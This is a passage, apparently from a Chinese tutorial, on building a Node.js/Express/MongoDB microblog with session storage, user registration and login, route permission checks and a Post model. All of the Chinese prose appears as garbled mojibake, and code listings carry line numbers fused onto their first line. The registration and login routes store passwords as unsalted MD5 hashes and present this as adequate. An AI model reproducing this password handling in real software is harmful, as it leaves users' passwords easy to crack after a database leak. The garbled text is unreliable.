ä¼šè¯æ”¯æŒåœ¨å®Œæˆç”¨æˆ·æ³¨å†Œå’Œç™»å½•åŠŸèƒ½ä¹‹å‰,éœ€è¦å…ˆäº†è§£ä¼šè¯çš„æ¦‚å¿µã€‚ä¼šè¯æ˜¯ä¸€ç§æŒä¹…çš„ç½‘ç»œåè®®ï¼Œç”¨äºŽå®ŒæˆæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´ä¸€äº›äº¤äº’è¡Œä¸ºï¼Œä¼šè¯æ˜¯ä¸€ä¸ªæ¯”è¾ƒè¿žæŽ¥ç²’åº¦æ›´å¤§çš„æ¦‚å¿µï¼Œä¸€æ¬¡ä¼šè¯å¯èƒ½åŒ…å«å¤šæ¬¡è¿žæŽ¥ï¼Œæ¯æ¬¡è¿žæŽ¥éƒ½è¢«è®¤ä¸ºæ˜¯ä¼šè¯çš„ä¸€äº›æ“ä½œã€‚åœ¨ç½‘ç»œåº”ç”¨å¼€å‘ä¸­ï¼Œæœ‰å¿…è¦å®žçŽ°ä¼šè¯æ¥å¸®åŠ©ç”¨æˆ·äº¤äº’ã€‚ä¾‹å¦‚ç½‘ä¸Šè´­ç‰©çš„åœºæ™¯ï¼Œç”¨æˆ·æµè§ˆäº†å¤šä¸ªé¡µé¢ï¼Œè´­ä¹°äº†ä¸€äº›ç‰©å“ï¼Œè¿™äº›è¯·æ±‚åœ¨å¤šæ¬¡è¿žæŽ¥ä¸­å®Œæˆã€‚è®¸å¤šåº”ç”¨å±‚ç½‘ç»œåè®®éƒ½æ˜¯ç”±ä¼šè¯æ”¯æŒçš„ï¼Œå¦‚ FTPã€Telnet ç­‰ï¼Œè€Œ HTTP åè®®æ˜¯æ— çŠ¶æ€çš„ï¼Œæœ¬èº«ä¸æ”¯æŒä¼šè¯ï¼Œå› æ­¤åœ¨æ²¡æœ‰é¢å¤–æ‰‹æ®µçš„å¸®åŠ©ä¸‹ï¼Œå‰é¢åœºæ™¯ä¸­æœåŠ¡å™¨ä¸çŸ¥é“ç”¨æˆ·è´­ä¹°äº†ä»€ä¹ˆã€‚ ä¸ºäº†åœ¨æ— çŠ¶æ€çš„ HTTP åè®®ä¹‹ä¸Šå®žçŽ°ä¼šè¯ï¼ŒCookie è¯žç”Ÿäº†ã€‚Cookie æ˜¯ä¸€äº›å­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„æ¶ˆæ¯ï¼Œæ¯æ¬¡è¿žæŽ¥çš„æ—¶å€™ç”±æµè§ˆå™¨å‘æœåŠ¡å™¨é€’äº¤ï¼ŒæœåŠ¡å™¨ä¹Ÿå‘æµè§ˆå™¨å‘èµ·å­˜å‚¨ Cookie çš„è¯·æ±‚ï¼Œä¾é è¿™æ ·çš„æ‰‹æ®µæœåŠ¡å™¨å¯ä»¥è¯†åˆ«å®¢æˆ·ç«¯ã€‚æˆ‘ä»¬é€šå¸¸æ„ä¹‰ä¸Šçš„ HTTP ä¼šè¯åŠŸèƒ½å°±æ˜¯è¿™æ ·å®žçŽ°çš„ã€‚å…·ä½“æ¥è¯´ï¼Œæµè§ˆå™¨é¦–æ¬¡å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦å¹¶å‘é€ç»™å®¢æˆ·ç«¯æµè§ˆå™¨ï¼Œæµè§ˆå™¨å°†è¿™ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦å­˜å‚¨åœ¨ Cookie ä¸­ï¼Œä»¥åŽæ¯æ¬¡å†å‘èµ·è¯·æ±‚ï¼Œå®¢æˆ·ç«¯æµè§ˆå™¨éƒ½ä¼šå‘æœåŠ¡å™¨ä¼ é€è¿™ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦ï¼ŒæœåŠ¡å™¨é€šè¿‡è¿™ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦æ¥è¯†åˆ«ç”¨æˆ·ã€‚ å¯¹äºŽå¼€å‘è€…æ¥è¯´ï¼Œæˆ‘ä»¬æ— é¡»å…³å¿ƒæµè§ˆå™¨ç«¯çš„å­˜å‚¨ï¼Œéœ€è¦å…³æ³¨çš„ä»…ä»…æ˜¯å¦‚ä½•é€šè¿‡è¿™ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦æ¥è¯†åˆ«ç”¨æˆ·ã€‚å¾ˆå¤šæœåŠ¡ç«¯è„šæœ¬è¯­è¨€éƒ½æœ‰ä¼šè¯åŠŸèƒ½ï¼Œå¦‚ PHPï¼ŒæŠŠæ¯ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ã€‚Express ä¹Ÿæä¾›äº†ä¼šè¯ä¸­é—´ä»¶ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯æŠŠç”¨æˆ·ä¿¡æ¯å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä½†æˆ‘ä»¬æ—¢ç„¶å·²ç»æœ‰äº† MongoDBï¼Œä¸å¦¨æŠŠä¼šè¯ä¿¡æ¯å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œä¾¿äºŽæŒä¹…ç»´æŠ¤ã€‚ä¸ºäº†ä½¿ç”¨è¿™ä¸€åŠŸèƒ½ï¼Œæˆ‘ä»¬é¦–å…ˆè¦èŽ·å¾—ä¸€ä¸ªå«åš connect-mongo çš„æ¨¡å—ã€‚ 1npm i connect-mongo -S åœ¨ app.js ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ 123456789var MongoStore = require('connect-mongo');var settings = require('./settings');app.use(express.session(&#123; secret: settings.cookieSecret, store: new MongoStore(&#123; db: settings.db &#125;)&#125;)); å…¶ä¸­ express.cookieParser() æ˜¯ Cookie è§£æžçš„ä¸­é—´ä»¶ã€‚ express.session() åˆ™æä¾›ä¼šè¯æ”¯æŒï¼Œè®¾ç½®å®ƒçš„ store å‚æ•°ä¸º MongoStore å®žä¾‹ï¼ŒæŠŠä¼šè¯ä¿¡æ¯å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œä»¥é¿å…ä¸¢å¤±ã€‚åœ¨åŽé¢å¯ä»¥é€šè¿‡ req.session èŽ·å–å½“å‰ç”¨æˆ·çš„ä¼šè¯å¯¹è±¡ï¼Œä»¥ç»´æŠ¤ç”¨æˆ·ç›¸å…³çš„ä¿¡æ¯ã€‚ æ³¨å†Œå’Œç™»å…¥æˆ‘ä»¬å·²ç»å‡†å¤‡å¥½äº†æ•°æ®åº“è®¿é—®å’Œä¼šè¯å­˜å‚¨çš„ç›¸å…³ä¿¡æ¯ï¼ŒæŽ¥ä¸‹æ¥å¼€å§‹å®žçŽ°ç½‘ç«™çš„ç¬¬ä¸€ä¸ªåŠŸèƒ½ï¼Œç”¨æˆ·æ³¨å†Œå’Œç™»å…¥ã€‚ æ³¨å†Œé¡µé¢é¦–å…ˆæ¥è®¾è®¡ç”¨æˆ·æ³¨å†Œé¡µé¢çš„è¡¨å•ï¼Œåˆ›å»º views/reg.ejs æ–‡ä»¶ï¼Œå†…å®¹æ˜¯ï¼š 123456789101112131415161718192021222324252627&lt;form class="form-horizontal" method="post"&gt; &lt;fieldset&gt; &lt;legend&gt;ç”¨æˆ·æ³¨å†Œ&lt;/legend&gt; &lt;div class="control-group"&gt; &lt;label class="control-label" for="username"&gt;ç”¨æˆ·å&lt;/label&gt; &lt;div class="controls"&gt; &lt;input type="text" class="input-xlarge" id="username" name="username"&gt; &lt;p class="help-block"&gt;ä½ çš„è´¦æˆ·åç§°ï¼Œç”¨äºŽç™»å½•å’Œæ˜¾ç¤ºã€‚&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="control-group"&gt; &lt;label class="control-label" for="password"&gt;å£ä»¤&lt;/label&gt; &lt;div class="controls"&gt; &lt;input type="password" class="input-xlarge" id="password" name="password"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="control-group"&gt; &lt;label class="control-label" for="password-repeat"&gt;é‡å¤è¾“å…¥å£ä»¤&lt;/label&gt; &lt;div class="controls"&gt; &lt;input type="password" class="input-xlarge" id="password-repeat" name="password-repeat"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="form-actions"&gt; &lt;button type="submit" class="btn btn-primary"&gt;æ³¨å†Œ&lt;/button&gt; &lt;/div&gt; &lt;/fieldset&gt;&lt;/form&gt; è¿™ä¸ªè¡¨å•ä¸­æœ‰3ä¸ªè¾“å…¥å•å…ƒï¼Œåˆ†åˆ«æ˜¯ username ã€ password å’Œ password-repeat ã€‚è¡¨å•çš„è¯·æ±‚æ–¹æ³•æ˜¯ POSTï¼Œå°†ä¼šå‘é€åˆ°ç›¸åŒçš„è·¯å¾„ä¸‹ã€‚ æŽ¥ç€åœ¨ router/index.js é‡Œé¢è®¾ç½®å¥½è·¯ç”± 1234// ç”¨æˆ·æ³¨å†Œrouter.get('/reg', function (req, res, next) &#123; res.render('reg', &#123; title: 'ç”¨æˆ·æ³¨å†Œ' &#125;);&#125;); çŽ°åœ¨è¿è¡Œ app.jsï¼Œåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ http://localhost:3000/reg ï¼Œå¯ä»¥çœ‹åˆ° æ³¨å†Œå“åº”å®žçŽ°æ³¨å†Œå“åº”ï¼Œåœ¨ router/index.js é‡Œé¢æ·»åŠ  /reg çš„ POST å“åº”å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435router.post('/reg', function (req, res, next) &#123; console.log(res.body); if (req.body['password-repeat'] != req.body['password']) &#123; req.flash('error', 'ä¸¤æ¬¡è¾“å…¥çš„å£ä»¤ä¸ä¸€è‡´'); return res.redirect('/reg'); &#125; // ç”Ÿæˆå£ä»¤çš„æ•£åˆ—å€¼ var md5 = crypto.createHash('md5'); var password = md5.update(req.body.password).digest('base64'); var newUser = new User(&#123; name: req.body.username, password: password, &#125;); // æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ User.get(newUser.name, function (err, user) &#123; if (user) &#123; err = "Username is already exists." &#125; if (err) &#123; req.flash('error', err); return res.redirect('/reg'); &#125; // å¦‚æžœä¸å­˜åœ¨åˆ™æ–°å¢žç”¨æˆ· newUser.save(function (err) &#123; if (err) &#123; req.flash('error', err); return res.redirect('/reg'); &#125; req.session.user = newUser; req.flash('success', 'æ³¨å†ŒæˆåŠŸ'); res.redirect('/reg'); &#125;); &#125;);&#125;); req.body å°±æ˜¯ POST è¯·æ±‚ä¿¡æ¯è§£æžè¿‡åŽçš„å¯¹è±¡ï¼Œä¾‹å¦‚æˆ‘ä»¬è¦è®¿é—®ç”¨æˆ·ä¼ é€’çš„ password åŸŸçš„å€¼ï¼Œåªéœ€è®¿é—® req.body[â€˜passwordâ€™] å³å¯ req.flash æ˜¯ Express æä¾›çš„ä¸€ä¸ªå¥‡å¦™çš„å·¥å…·ï¼Œé€šè¿‡å®ƒå¯ä»¥ä¿å­˜çš„å˜é‡åªä¼šåœ¨ç”¨æˆ·å½“å‰å’Œä¸‹ä¸€æ¬¡çš„è¯·æ±‚ä¸­è¢«è®¿é—®ï¼Œä¹‹åŽå°±ä¼šè¢«æ¸…é™¤æŽ‰ï¼Œé€šè¿‡å®ƒå¯ä»¥å¾ˆæ–¹ä¾¿åœ°å®žçŽ°é¡µé¢çš„é€šçŸ¥å’Œé”™è¯¯æ¶ˆæ¯æ˜¾ç¤ºåŠŸèƒ½ res.redirect æ˜¯é‡å®šå‘åŠŸèƒ½ï¼Œé€šè¿‡å®ƒä¼šå‘ç”¨æˆ·è¿”å›žä¸€ä¸ª 303 See Other çŠ¶æ€ï¼Œé€šçŸ¥æµè§ˆå™¨è½¬å‘ç›¸åº”é¡µé¢ã€‚ crypto æ˜¯ Node.js çš„ä¸€ä¸ªæ ¸å¿ƒæ¨¡å—ï¼ŒåŠŸèƒ½æ˜¯åŠ å¯†å¹¶ç”Ÿæˆå„ç§æ•£åˆ—ï¼Œä½¿ç”¨å®ƒä¹‹å‰é¦–å…ˆè¦å£°æ˜Ž var crypto = require(â€˜cryptoâ€™) User æ˜¯è®¾è®¡çš„ç”¨æˆ·å¯¹è±¡ï¼ŒåŽé¢ä¼šè¯¦ç»†ä»‹ç»ã€‚ User.get çš„åŠŸèƒ½æ˜¯é€šè¿‡ç”¨æˆ·åèŽ·å–å·²çŸ¥ç”¨æˆ·ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬åˆ¤æ–­ç”¨æˆ·åæ˜¯å¦å·²ç»å­˜åœ¨ã€‚ User.save å¯ä»¥å°†ç”¨æˆ·å¯¹è±¡çš„ä¿®æ”¹å†™å…¥æ•°æ®åº“ã€‚ é€šè¿‡ req.session.user = newUser å‘ä¼šè¯å¯¹è±¡å†™å…¥äº†å½“å‰ç”¨æˆ·çš„ä¿¡æ¯ã€‚ ç”¨æˆ·æ¨¡åž‹åœ¨å‰é¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬ç›´æŽ¥ä½¿ç”¨äº† User å¯¹è±¡ã€‚ User æ˜¯ä¸€ä¸ªæè¿°æ•°æ®çš„å¯¹è±¡ï¼Œå³ MVCæž¶æž„ä¸­çš„æ¨¡åž‹ã€‚å‰é¢æˆ‘ä»¬ä½¿ç”¨äº†è®¸å¤šè§†å›¾å’ŒæŽ§åˆ¶å™¨ï¼Œè¿™æ˜¯ç¬¬ä¸€æ¬¡æŽ¥è§¦åˆ°æ¨¡åž‹ã€‚ä¸Žè§†å›¾å’ŒæŽ§åˆ¶å™¨ä¸åŒï¼Œæ¨¡åž‹æ˜¯çœŸæ­£ä¸Žæ•°æ®æ‰“äº¤é“çš„å·¥å…·ï¼Œæ²¡æœ‰æ¨¡åž‹ï¼Œç½‘ç«™å°±åªæ˜¯ä¸€ä¸ªå¤–å£³ï¼Œä¸èƒ½å‘æŒ¥çœŸå®žçš„ä½œç”¨ï¼Œå› æ­¤å®ƒæ˜¯æ¡†æž¶ä¸­æœ€æ ¹æœ¬çš„éƒ¨åˆ†ã€‚çŽ°åœ¨å°±è®©æˆ‘ä»¬æ¥å®žçŽ° User æ¨¡åž‹å§ã€‚ åœ¨ models ç›®å½•ä¸­åˆ›å»º user.js çš„æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172var mongodb = require('./db');function User(user) &#123; this.name = user.name; this.password = user.password;&#125;;module.exports = User;/* * ä¿å­˜ä¸€ä¸ªç”¨æˆ·åˆ°æ•°æ®åº“ * @param &#123;Function&#125; callback: æ‰§è¡Œå®Œæ•°æ®åº“æ“ä½œçš„åº”è¯¥æ‰§è¡Œçš„å›žè°ƒå‡½æ•° */User.prototype.save = function save(callback) &#123; // å­˜å…¥ Mongodb çš„æ–‡æ¡£ var user = &#123; name: this.name, password: this.password, &#125;; mongodb.open(function (err, db) &#123; if (err) &#123; return callback(err); &#125; // è¯»å– users é›†åˆ db.collection('users', function (err, collection) &#123; if (err) &#123; mongodb.close(); return callback(err); &#125; //ä¸ºnameå±žæ€§æ·»åŠ ç´¢å¼•ï¼Œæ–°ç‰ˆæœ¬çš„ensureIndexæ–¹æ³•éœ€è¦ä¸€ä¸ªå›žè°ƒå‡½æ•° collection.ensureIndex('name', &#123; unique: true &#125;); //å†™å…¥useræ–‡æ¡£ collection.insert(user, &#123; safe: true &#125;, function (err, user) &#123; mongodb.close(); callback(err, user); &#125;); &#125;); &#125;);&#125;/* * æŸ¥è¯¢åœ¨é›†åˆ`users`æ˜¯å¦å­˜åœ¨ä¸€ä¸ªåˆ¶å®šç”¨æˆ·åçš„ç”¨æˆ· * @param &#123;String&#125; username: éœ€è¦æŸ¥è¯¢çš„ç”¨æˆ·çš„åå­— * @param &#123;Function&#125; callback: æ‰§è¡Œå®Œæ•°æ®åº“æ“ä½œçš„åº”è¯¥æ‰§è¡Œçš„å›žè°ƒå‡½æ•° */User.get = function get(username, callback) &#123; mongodb.open(function (err, db) &#123; if (err) &#123; return callback(err); &#125; // è¯»å– users é›†åˆ db.collection('users', function (err, collection) &#123; if (err) &#123; mongodb.close(); return callback(err); &#125; // æŸ¥æ‰¾ name å±žæ€§ä¸º username çš„æ–‡æ¡£ collection.findOne(&#123; name: username &#125;, function (err, doc) &#123; mongodb.close(); if (doc) &#123; // å°è£…æ–‡æ¡£ä¸º User å¯¹è±¡ var user = new User(doc); callback(err, user); &#125; else &#123; callback(err, null); &#125; &#125;); &#125;); &#125;);&#125;; ä»¥ä¸Šä»£ç å®žçŽ°äº†ä¸¤ä¸ªæŽ¥å£ï¼Œ User.prototype.save å’Œ User.getï¼Œ å‰è€…æ˜¯å¯¹è±¡å®žä¾‹çš„æ–¹æ³•ï¼Œç”¨äºŽå°†ç”¨æˆ·å¯¹è±¡çš„æ•°æ®ä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼ŒåŽè€…æ˜¯å¯¹è±¡æž„é€ å‡½æ•°çš„æ–¹æ³•ï¼Œç”¨äºŽä»Žæ•°æ®åº“ä¸­æŸ¥æ‰¾æŒ‡å®šçš„ç”¨æˆ·ã€‚ è§†å›¾äº¤äº’çŽ°åœ¨å‡ ä¹Žå·²ç»ä¸‡äº‹ä¿±å¤‡ï¼Œåªå·®è§†å›¾çš„æ”¯æŒäº†ã€‚ä¸ºäº†å®žçŽ°ä¸åŒç™»å½•çŠ¶æ€ä¸‹é¡µé¢å‘ˆçŽ°ä¸åŒå†…å®¹çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºåŠ¨æ€è§†å›¾åŠ©æ‰‹ï¼Œé€šè¿‡å®ƒæˆ‘ä»¬æ‰èƒ½åœ¨è§†å›¾ä¸­è®¿é—®ä¼šè¯ä¸­çš„ç”¨æˆ·æ•°æ®ã€‚åŒæ—¶ä¸ºäº†æ˜¾ç¤ºé”™è¯¯å’ŒæˆåŠŸçš„ä¿¡æ¯ï¼Œä¹Ÿè¦åœ¨åŠ¨æ€è§†å›¾åŠ©æ‰‹ä¸­å¢žåŠ å“åº”çš„å‡½æ•°ã€‚æ‰“å¼€ app.jsï¼Œæ·»åŠ ä»¥ä¸‹ä»£ç ï¼š 123var flash = require('connect-flash');// åœ¨è·¯ç”±åŽé¢é…ç½®app.use(flash()); ç„¶åŽåœ¨ routes/index.js é‡Œé¢æ·»åŠ  12345678910router.use(function (req, res, next) &#123; res.locals.user=req.session.user; var err = req.flash('error'); var success = req.flash('success'); res.locals.error = err.length ? err : null; res.locals.success = success.length ? success : null; next();&#125;); ä¿®æ”¹ header.ejs ä¸­çš„å¯¼èˆªéƒ¨åˆ† 123456789&lt;ul class=&quot;nav&quot;&gt; &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;/&quot;&gt;é¦–é¡µ&lt;/a&gt;&lt;/li&gt; &lt;% if (!user) &#123; %&gt; &lt;li&gt;&lt;a href=&quot;/login&quot;&gt;ç™»å…¥&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;/reg&quot;&gt;æ³¨å†Œ&lt;/a&gt;&lt;/li&gt; &lt;% &#125; else &#123; %&gt; &lt;li&gt;&lt;a href=&quot;/logout&quot;&gt;ç™»å‡º&lt;/a&gt;&lt;/li&gt; &lt;% &#125; %&gt;&lt;/ul&gt; ä¸Šé¢åŠŸèƒ½æ˜¯ä¸ºå·²ç™»å…¥ç”¨æˆ·å’Œæœªç™»å…¥ç”¨æˆ·æ˜¾ç¤ºä¸åŒçš„ä¿¡æ¯ã€‚åœ¨ container ä¸­ï¼Œ &lt;%- body %&gt;ä¹‹å‰åŠ å…¥ï¼š 12345678910&lt;% if (success) &#123; %&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;%= success %&gt; &lt;/div&gt;&lt;% &#125; %&gt;&lt;% if (error) &#123; %&gt; &lt;div class=&quot;alert alert-error&quot;&gt; &lt;%= error %&gt; &lt;/div&gt;&lt;% &#125; %&gt; å®ƒçš„åŠŸèƒ½æ˜¯é¡µé¢é€šçŸ¥ã€‚ ä¸‹é¢åˆ†åˆ«æ˜¯æ³¨å†Œæ—¶é‡åˆ°é”™è¯¯å’Œæ³¨å†ŒæˆåŠŸä»¥åŽçš„ç”»é¢ã€‚ ç™»å…¥å’Œç™»å‡ºå®Œæˆç”¨æˆ·æ³¨å†Œçš„åŠŸèƒ½ä»¥åŽå†å®žçŽ°ç”¨æˆ·ç™»å…¥å’Œç™»å‡ºå°±ç›¸å½“å®¹æ˜“äº†ã€‚æŠŠä¸‹é¢çš„ä»£ç åŠ åˆ° routes/index.js ä¸­ï¼š 12345678910111213141516171819202122// ç”¨æˆ·ç™»å½•router.get('/login', function (req, res, next) &#123; res.render('login', &#123; title: 'ç”¨æˆ·ç™»å½•' &#125;);&#125;);router.post('/login', function (req, res, next) &#123; // ç”Ÿæˆå£ä»¤çš„æ•£åˆ—å€¼ var md5 = crypto.createHash('md5'); var password = md5.update(req.body.password).digest('base64'); User.get(req.body.username, function (err, user) &#123; if (!user) &#123; req.flash('error', 'ç”¨æˆ·ä¸å­˜åœ¨'); return res.redirect('/login'); &#125; if (user.password != password) &#123; req.flash('error', 'ç”¨æˆ·å£ä»¤é”™è¯¯'); return res.redirect('/login'); &#125; req.session.user = user; req.flash('success', 'ç™»å…¥æˆåŠŸ'); res.redirect('/'); &#125;);&#125;); åœ¨è¿™é‡Œæ¸…æ™°åœ°çœ‹å‡ºç™»å…¥å’Œç™»å‡ºä»…ä»…æ˜¯ req.session.user å˜é‡çš„æ ‡è®°ï¼Œéžå¸¸ç®€å•ã€‚ä½†è¿™ä¼šä¸ä¼šæœ‰å®‰å…¨æ€§é—®é¢˜å‘¢ï¼Ÿä¸ä¼šçš„ï¼Œå› ä¸ºè¿™ä¸ªå˜é‡åªæœ‰æœåŠ¡ç«¯æ‰èƒ½è®¿é—®åˆ°ï¼Œåªè¦ä¸æ˜¯é»‘å®¢æ”»ç ´äº†æ•´ä¸ªæœåŠ¡å™¨ï¼Œæ— æ³•ä»Žå¤–éƒ¨æ”¹åŠ¨ã€‚ åˆ›å»º views/login.ejs 1234567891011121314151617181920&lt;form class="form-horizontal" method="post"&gt; &lt;fieldset&gt; &lt;legend&gt;ç”¨æˆ·ç™»å…¥&lt;/legend&gt; &lt;div class="control-group"&gt; &lt;label class="control-label" for="username"&gt;ç”¨æˆ·å&lt;/label&gt; &lt;div class="controls"&gt; &lt;input type="text" class="input-xlarge" id="username" name="username"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="control-group"&gt; &lt;label class="control-label" for="password"&gt;å£ä»¤&lt;/label&gt; &lt;div class="controls"&gt; &lt;input type="password" class="input-xlarge" id="password" name="password"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="form-actions"&gt; &lt;button type="submit" class="btn btn-primary"&gt;ç™»å…¥&lt;/button&gt; &lt;/div&gt; &lt;/fieldset&gt;&lt;/form&gt; åœ¨æµè§ˆå™¨ä¸­è®¿é—® http://localhost:3000/login å¯ä»¥çœ‹åˆ°é¡µé¢ è‡³æ­¤ç”¨æˆ·æ³¨å†Œå’Œç™»å½•çš„åŠŸèƒ½å°±å®Œå…¨å®žçŽ°äº†ã€‚ é¡µé¢æƒé™æŽ§åˆ¶è¿˜æœ‰ä¸€ä¸ªå·¥ä½œè¦å®Œæˆï¼Œå°±æ˜¯ä¸ºé¡µé¢è®¾ç½®è®¿é—®æƒé™ã€‚ä¾‹å¦‚ï¼Œç™»å‡ºåŠŸèƒ½åº”è¯¥åªå¯¹ç™»å…¥çš„ç”¨æˆ·å¼€å‘ï¼Œæ³¨å†Œå’Œç™»å…¥é¡µé¢åˆ™åº”è¯¥é˜»æ­¢å·²ç™»å…¥çš„ç”¨æˆ·è®¿é—®ã€‚å®žçŽ°è¿™ä¸€ç‚¹ï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯åœ¨æ¯ä¸ªé¡µé¢çš„è·¯ç”±å“åº”å‡½æ•°å†…æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç»ç™»å½•ï¼Œä½†è¿™ä¼šå¸¦æ¥å¾ˆå¤šé‡å¤ä»£ç ï¼Œå› æ­¤åˆ©ç”¨è·¯ç”±ä¸­é—´ä»¶æ¥å®žçŽ°è¿™ä¸ªåŠŸèƒ½ã€‚ åŒä¸€è·¯å¾„ç»‘å®šå¤šä¸ªå“åº”å‡½æ•°çš„æ–¹æ³•ï¼Œé€šè¿‡è°ƒç”¨ next() è½¬ç§»æŽ§åˆ¶æƒï¼Œè¿™ç§æ–¹æ³•å«åšè·¯ç”±ä¸­é—´ä»¶ã€‚æŠŠç”¨æˆ·ç™»å…¥çŠ¶æ€æ£€æŸ¥æ”¾åœ¨è·¯ç”±ä¸­é—´ä»¶ä¸­ï¼Œæ¯ä¸ªè·¯å¾„å‰å¢žåŠ è·¯ç”±ä¸­é—´ä»¶ï¼Œæ—¢å¯ä»¥å®žçŽ°é¡µé¢æƒé™æŽ§åˆ¶ã€‚ routes/index.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// ç”¨æˆ·æ³¨å†Œrouter.get('/reg', checkNotLogin);router.get('/reg', function (req, res, next) &#123; res.render('reg', &#123; title: 'ç”¨æˆ·æ³¨å†Œ' &#125;);&#125;);router.post('/reg', checkNotLogin);router.post('/reg', function (req, res, next) &#123; if (req.body['password-repeat'] != req.body['password']) &#123; req.flash('error', 'ä¸¤æ¬¡è¾“å…¥çš„å£ä»¤ä¸ä¸€è‡´'); return res.redirect('/reg'); &#125; // ç”Ÿæˆå£ä»¤çš„æ•£åˆ—å€¼ var md5 = crypto.createHash('md5'); var password = md5.update(req.body.password).digest('base64'); var newUser = new User(&#123; name: req.body.username, password: password, &#125;); // æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ User.get(newUser.name, function (err, user) &#123; if (user) &#123; err = "Username is already exists." &#125; if (err) &#123; req.flash('error', err); return res.redirect('/reg'); &#125; // å¦‚æžœä¸å­˜åœ¨åˆ™æ–°å¢žç”¨æˆ· newUser.save(function (err) &#123; if (err) &#123; req.flash('error', err); return res.redirect('/reg'); &#125; req.session.user = newUser; req.flash('success', 'æ³¨å†ŒæˆåŠŸ'); res.redirect('/'); &#125;); &#125;);&#125;);// ç”¨æˆ·ç™»å½•router.get('/login', checkNotLogin);router.get('/login', function (req, res, next) &#123; res.render('login', &#123; title: 'ç”¨æˆ·ç™»å½•' &#125;);&#125;);router.post('/login', checkNotLogin);router.post('/login', function (req, res, next) &#123; // ç”Ÿæˆå£ä»¤çš„æ•£åˆ—å€¼ var md5 = crypto.createHash('md5'); var password = md5.update(req.body.password).digest('base64'); User.get(req.body.username, function (err, user) &#123; if (!user) &#123; req.flash('error', 'ç”¨æˆ·ä¸å­˜åœ¨'); return res.redirect('/login'); &#125; if (user.password != password) &#123; req.flash('error', 'ç”¨æˆ·å£ä»¤é”™è¯¯'); return res.redirect('/login'); &#125; req.session.user = user; req.flash('success', 'ç™»å…¥æˆåŠŸ'); res.redirect('/'); &#125;);&#125;);// ç”¨æˆ·ç™»å‡º router.get('/logout', checkLogin);router.get('/logout', function (req, res, next) &#123; req.session.user = null; req.flash('success', 'ç™»å‡ºæˆåŠŸ'); res.redirect('/');&#125;);function checkLogin(req, res, next) &#123; if(!req.session.user)&#123; req.flash('error','æœªç™»å…¥'); return res.redirect('/login'); &#125; next();&#125;function checkNotLogin(req, res, next)&#123; if(req.session.user)&#123; req.flash('error','å·²ç™»å…¥'); return res.redirect('/'); &#125; next();&#125; å‘è¡¨å¾®åšçŽ°åœ¨ç½‘ç«™å·²ç»å…·å¤‡äº†ç”¨æˆ·æ³¨å†Œã€ç™»å…¥ã€é¡µé¢æƒé™æŽ§åˆ¶çš„åŠŸèƒ½ï¼Œè¿™äº›åŠŸèƒ½ä¸ºç½‘ç«™æœ€æ ¸å¿ƒçš„éƒ¨åˆ†â€”â€”å‘è¡¨å¾®åšåšå¥½äº†å‡†å¤‡,æˆ‘ä»¬å¯ä»¥æ¥å®žçŽ°å‘è¡¨å¾®åšçš„åŠŸèƒ½ï¼Œå®Œæˆæ•´ä¸ªç½‘ç«™çš„è®¾è®¡ã€‚ å¾®åšæ¨¡åž‹ä»Žæ¨¡åž‹è®¾è®¡å¼€å§‹ï¼Œä»¿ç…§ç”¨æˆ·æ¨¡åž‹ï¼Œå°†å¾®åšæ¨¡åž‹å‘½åä¸º Post å¯¹è±¡ï¼Œå®ƒæ‹¥æœ‰ä¸Ž User ç›¸ä¼¼çš„æŽ¥å£ï¼Œåˆ†åˆ«æ˜¯ Post.get å’Œ Post.prototype.saveã€‚Post.get çš„åŠŸèƒ½æ˜¯ä»Žæ•°æ®åº“ä¸­èŽ·å–å¾®åšï¼Œå¯ä»¥æŒ‡å®šç”¨æˆ·èŽ·å–ï¼Œä¹Ÿå¯ä»¥èŽ·å–å…¨éƒ¨çš„å†…å®¹ã€‚Post.prototype.save æ˜¯ Post å¯¹è±¡å®žä¾‹çš„æ–¹æ³•ï¼Œç”¨äºŽå°†å¯¹è±¡çš„å˜åŠ¨ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚ åˆ›å»º models/post.jsï¼Œå†™å…¥ä»¥ä¸‹å†…å®¹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687var mongodb = require('./db');function Post(username, post, time) &#123; this.user = username; this.post = post; if (time) &#123; this.time = time; &#125; else &#123; this.time = new Date(); &#125;&#125;module.exports = Post;/* * 